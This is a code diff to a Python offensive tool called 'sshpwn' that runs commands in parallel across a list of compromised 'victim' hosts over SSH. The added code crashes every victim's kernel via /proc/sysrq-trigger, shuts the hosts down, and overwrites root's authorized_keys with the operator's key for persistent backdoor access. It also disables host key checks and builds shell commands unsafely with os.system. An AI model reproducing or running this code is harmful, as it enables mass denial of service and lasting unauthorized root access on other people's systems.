@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-# sshpwn v1.5.1
+# sshpwn v1.6
 
 # Copyright (c) 2016 Shawn Pang
 # http://shawnpang.com
@@ -187,6 +187,21 @@ def getvictimlist(configs):
         return None
 
 def builtincmd(cmd, victims):
+     
+    def parallelssh(victims, cmd):
+        hoststring = ""
+        for victim in victims:
+            hoststring += victim.user + "@" + victim.host + " "    
+        print()
+        os.system("parallel-ssh -i -O StrictHostKeyChecking=no -t 1 -p 10 -H \"" + hoststring + "\" -A \"" + cmd + "\"")
+
+    def parallelscp(victims, local, remote):
+        hoststring = ""
+        for victim in victims:
+            hoststring += victim.user + "@" + victim.host + " "    
+        print()
+        os.system("parallel-scp -O StrictHostKeyChecking=no -t 1 -p 10 -H \"" + hoststring + "\" -A " + local + " " + remote)
+
     if not cmd[0]:
         return 2
     elif cmd[0] == "help":
@@ -202,14 +217,14 @@ def builtincmd(cmd, victims):
         consolidatevictims(victims)
         return 2
     elif cmd[0] == "export":
-        def exportusage():
+        def usage():
             print(cs.status, "Usage: export [format: sshpwn, iplist, both] [output w/o extension]")
         if len(cmd) != 2:
-            exportusage()
+            usage()
             return 2
         params = cmd[1].split(" ")
         if len(params) != 2:
-            exportusage()
+            usage()
             return 2
         elif params[0] != "sshpwn" and params[0] != "iplist" and params[0] != "both":
             print(cs.error, "Unknown format '" + params[0] + "'")
@@ -237,33 +252,43 @@ def builtincmd(cmd, victims):
         print(cs.good, "Exported list to", params[1])
         return 2
 
-    # TODO: Parallel Command
-    elif cmd[0] == "parallel":
-        def parallelusage():
-            print(cs.status, "Usage: parallel [mode: ssh, scp] [command | file] [if scp: remote location]")
-        if len(cmd) != 2:
-            parallelusage()
-        else:
-            params = cmd[1].split(" ")
-            if len(params) < 2:
-                parallelusage()
-            elif params[0] != "ssh" and params[0] != "scp":
-                print(cs.error, "Unknown format '" + params[0] + "'")
-            else:
-                hoststring = ""
-                for victim in victims:
-                    hoststring += victim.user + "@" + victim.host + " " 
-                
-                if params[0] == "ssh":
-                    print()
-                    os.system("parallel-ssh -i -O StrictHostKeyChecking=no -H \"" + hoststring + "\" -l root -A " + params[1])
-                elif params[0] == "scp": 
-                    if len(params) < 3:
-                        print(cs.error, "Missing remote location!")
-                    else:
-                        pass
-        
+    elif cmd[0] == "command":
+        def usage():
+            print(cs.status, "Usage: command [command]")
+        if len(cmd) < 2:
+            usage()
+            return 2
+
+        parallelssh(victims, cmd[1])
         return 2
+
+    elif cmd[0] == "copy":
+        def usage():
+            print(cs.status, "Usage: copy [local] [remote]")
+        if len(cmd) < 2:
+            usage()
+            return 2
+        directories = cmd[1].split(" ")
+        if len(directories) != 2:
+            usage()
+            return 2
+
+        parallelscp(victims, directories[0], directories[1])
+        return 2
+
+    elif cmd[0] == "freeze":
+        parallelssh(victims, "echo c > /proc/sysrq-trigger")
+        return 2 
+
+    elif cmd[0] == "shutdown":
+        parallelssh(victims, "init 0")
+        return 2 
+
+    elif cmd[0] == "injectkeys":
+        parallelssh(victims, "mkdir -p /root/.ssh")
+        parallelscp(victims, "/home/optixal/.ssh/id_rsa.pub", "/root/.ssh/authorized_keys")
+        parallelssh(victims, "service sshd reload")
+        return 2 
 
 def execute(cmd, victim, configs):
     try:
